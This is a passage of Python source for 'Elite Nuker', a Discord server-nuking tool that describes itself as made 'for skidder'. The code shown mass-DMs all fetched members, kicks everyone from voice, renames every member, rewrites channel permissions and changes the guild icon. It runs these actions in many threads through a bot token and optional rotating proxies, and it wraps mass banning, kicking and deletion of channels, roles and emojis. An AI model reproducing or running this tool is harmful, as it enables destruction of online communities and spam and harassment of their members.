            time.sleep(1.5)
            self.menu()
            
        elif ans == "12":
            # Change guild icon
            use_random = input("{}({}Elite{}) Use random icon from config? (y/n){}:{} ".format("\x1b[0m", "\x1b[38;5;21m", "\x1b[0m", "\x1b[38;5;21m", "\x1b[0m"))
            if use_random.lower() == "y":
                icon_url = random.choice(config["nuke"]["icon_urls"])
            else:
                icon_url = input("{}({}Elite{}) Icon URL{}:{} ".format("\x1b[0m", "\x1b[38;5;21m", "\x1b[0m", "\x1b[38;5;21m", "\x1b[0m"))
            self.execute_change_guild_icon(guildid, icon_url, token)
            time.sleep(1.5)
            self.menu()
            
        elif ans == "13":
            # Channel permissions
            channels = self.session.get(f"https://discord.com/api/v9/guilds/{guildid}/channels", headers={"Authorization": f"Bot {token}"}).json()
            for channel in channels:
                t = threading.Thread(target=self.execute_channel_permissions_async, args=(channel['id'], token))
                t.start()
                while threading.active_count() >= __threads__:
                    t.join()
            print("{}({}Elite{}) Updated permissions for all channels".format("\x1b[0m", "\x1b[38;5;21m", "\x1b[0m"))
            time.sleep(1.5)
            self.menu()
            
        elif ans == "14":
            # Mass DM
            content = input("{}({}Elite{}) Message{}:{} ".format("\x1b[0m", "\x1b[38;5;21m", "\x1b[0m", "\x1b[38;5;21m", "\x1b[0m"))
            self.messages.clear()
            members = open("fetched/members.txt", "r").read().splitlines()
            for member in members:
                t = threading.Thread(target=self.execute_mass_dm_async, args=(member, content, token))
                t.start()
                while threading.active_count() >= __threads__ - 10:
                    t.join()
            time.sleep(3)
            print("{}({}Elite{}) Sent DMs to {}/{} members".format("\x1b[0m", "\x1b[38;5;21m", "\x1b[0m", len(self.messages), len(members)))
            time.sleep(1.5)
            self.menu()
            
        elif ans == "15":
            # Voice Kick
            self.kicked.clear()
            members = open("fetched/members.txt", "r").read().splitlines()
            for member in members:
                t = threading.Thread(target=self.execute_voice_kick, args=(guildid, member, token))
                t.start()
                while threading.active_count() >= __threads__:
                    t.join()
            
            time.sleep(3)
            print("{}({}Elite{}) Kicked {}/{} members from voice".format("\x1b[0m", "\x1b[38;5;21m", "\x1b[0m", len(self.kicked), len(members)))
            time.sleep(1.5)
            self.menu()
            
        elif ans == "16":
            # Nickname Changer
            nickname = input("{}({}Elite{}) New Nickname{}:{} ".format("\x1b[0m", "\x1b[38;5;21m", "\x1b[0m", "\x1b[38;5;21m", "\x1b[0m"))
            members = open("fetched/members.txt", "r").read().splitlines()
            for member in members:
                t = threading.Thread(target=self.execute_change_nick, args=(guildid, member, nickname, token))
                t.start()
                while threading.active_count() >= __threads__:
                    t.join()
            
            time.sleep(3)
            print("{}({}Elite{}) Changed nicknames of all members".format("\x1b[0m", "\x1b[38;5;21m", "\x1b[0m"))
            time.sleep(1.5)
            self.menu()
            
        elif ans == "17":
            # Fetch Guilds
            self.fetch_guilds(token)
            time.sleep(1.5)
            self.menu()
            
        elif ans == "18":
            try:
                response = self.session.get("https://github.com/notspeezy/Elite-Nuker/releases/latest")
                check_version = response.headers.get('location').split('/')[7].split('v')[1]
                if VERSION != check_version:
                    print("{}({}Elite{}) You're using an outdated version!".format("\x1b[0m", "\x1b[38;5;21m", "\x1b[0m"))
                    webbrowser.open(f"https://github.com/notspeezy/Elite-Nuker/releases/tag/{check_version}")
                else:
                    print("{}({}Elite{}) You're using the current version!".format("\x1b[0m", "\x1b[38;5;21m", "\x1b[0m"))
            except:
                print("{}({}Elite{}) Couldn't reach the releases!".format("\x1b[0m", "\x1b[38;5;21m", "\x1b[0m"))
            
            time.sleep(1.5)
            self.menu()
    
    
        elif ans == "19":
            print("- Elite Nuker is a best discord multi tool nuker for skidder\n- Special thanks to Tavish for contributions\n- Press any key to return.")
            input("")
            self.menu()
        
        elif ans == "20":
            print("{}({}Elite{}) Thanks for using Elite!".format("\x1b[0m", "\x1b[38;5;21m", "\x1b[0m"))
            time.sleep(1.5)
            os._exit(0)
    
    def execute_ban_async(self, member: str, *args):
        # Wrapper to use with async operations
        guildid, token = args
        self.execute_ban(guildid, member, token)
    
    def execute_kick_async(self, member: str, *args):
        # Wrapper to use with async operations
        guildid, token = args
        self.execute_kick(guildid, member, token)
    
    def execute_delchannels_async(self, channel: str, *args):
        # Wrapper to use with async operations
        token, = args  # Note: comma is needed to make it a tuple
        self.execute_delchannels(channel, token)
    
    def execute_delroles_async(self, role: str, *args):
        # Wrapper to use with async operations
        guildid, token = args
        self.execute_delroles(guildid, role, token)
    
    def execute_delemojis_async(self, emoji: str, *args):
        # Wrapper to use with async operations
        guildid, token = args
        self.execute_delemojis(guildid, emoji, token)
    
    def execute_mass_dm_async(self, userid: str, *args):
        # Wrapper to use with async operations
        content, token = args
        self.execute_mass_dm(userid, content, token)
    
    def execute_channel_permissions_async(self, channel_id: str, *args):
        # Wrapper to use with async operations
        token, = args
        self.execute_channel_permissions(channel_id, token)
    
    def execute_voice_kick(self, guildid: str, userid: str, token: str):
        # Kick user from voice channel by editing their voice channel
        payload = {
            "channel_id": None  # Disconnect from voice
        }
        try:
            response = self.session.patch(f"https://discord.com/api/{next(self.version)}/guilds/{guildid}/members/{userid}", headers={"Authorization": f"Bot {token}"}, json=payload)
            if response.status_code == 200:
                print("{}({}+{}) Kicked {}{} from voice".format("\x1b[0m", "\x1b[38;5;21m", "\x1b[0m", "\x1b[38;5;21m", userid))
            else:
                print("{}({}-{}) Failed to kick {}{} from voice".format("\x1b[0m", "\x1b[31m", "\x1b[0m", "\x1b[31m", userid))
        except Exception as e:
            print("{}({}-{}) Error kicking {}{} from voice: {}".format("\x1b[0m", "\x1b[31m", "\x1b[0m", "\x1b[31m", userid, e))
    
    def execute_change_nick(self, guildid: str, userid: str, nickname: str, token: str):
        # Change user's nickname
        payload = {
            "nick": nickname
        }
        try:
            response = self.session.patch(f"https://discord.com/api/{next(self.version)}/guilds/{guildid}/members/{userid}", headers={"Authorization": f"Bot {token}"}, json=payload)
            if response.status_code == 200:
                print("{}({}+{}) Changed nickname of {}{} to {}{}".format("\x1b[0m", "\x1b[38;5;21m", "\x1b[0m", "\x1b[38;5;21m", userid, "\x1b[38;5;21m", nickname))
            else:
                print("{}({}-{}) Failed to change nickname of {}{}".format("\x1b[0m", "\x1b[31m", "\x1b[0m", "\x1b[31m", userid))
        except Exception as e:
            print("{}({}-{}) Error changing nickname of {}{}: {}".format("\x1b[0m", "\x1b[31m", "\x1b[0m", "\x1b[31m", userid, e))

async def on_ready():
    print("{}({}Elite{}) Authenticated as{}: {}{}".format("\x1b[0m", "\x1b[38;5;21m", "\x1b[0m", "\x1b[38;5;21m", "\x1b[0m", f"{client.user.name}#{client.user.discriminator}"))
    time.sleep(1.5)
    Elite().menu()
    

if __name__ == "__main__":
    try:
        os.system("title Elite Nuker ^| Authentication & mode con: cols=95 lines=25")
        token = input(f"{Fore.CYAN}[{Fore.GREEN}TOKEN{Fore.CYAN}]: {Style.RESET_ALL}")
        os.system("cls") if os.name == "nt" else os.system("clear")
        
        # Automatically fetch the first guild the bot is in
        import httpx
        import json
        
        # Create client with proper intents
        client = commands.Bot(command_prefix="+", help_command=None, intents=intents)
        proxy = "http://" + next(proxies) if config["proxy"] == True else None
        session = httpx.Client(proxies=proxy)
        
        # Get guilds the bot is in
        response = session.get("https://discord.com/api/v9/users/@me/guilds", headers={"Authorization": f"Bot {token}"})
        if response.status_code == 200:
            guilds = response.json()
            if guilds:
                global guildid
                guildid = guilds[0]['id']  # Use the first guild
                print(f"{Fore.GREEN}[{Fore.WHITE}+{Fore.GREEN}] Using guild: {guilds[0]['name']} (ID: {guildid})")
            else:
                print(f"{Fore.RED}[{Fore.WHITE}-{Fore.RED}] Bot is not in any guilds")
                exit(1)
        else:
            print(f"{Fore.RED}[{Fore.WHITE}-{Fore.RED}] Failed to fetch guilds")
            exit(1)
        
        # Print the ASCII art and menu options after token input and guild fetch
        print(Elite_art)
        print(options)
        
        # Assign the event handler to the client
        client.event(on_ready)
        client.run(token)
    except Exception as e:
        print("{}({}-{}) {}".format("\x1b[0m", "\x1b[31m", "\x1b[0m", e))
        time.sleep(1.5)
        os._exit(0)
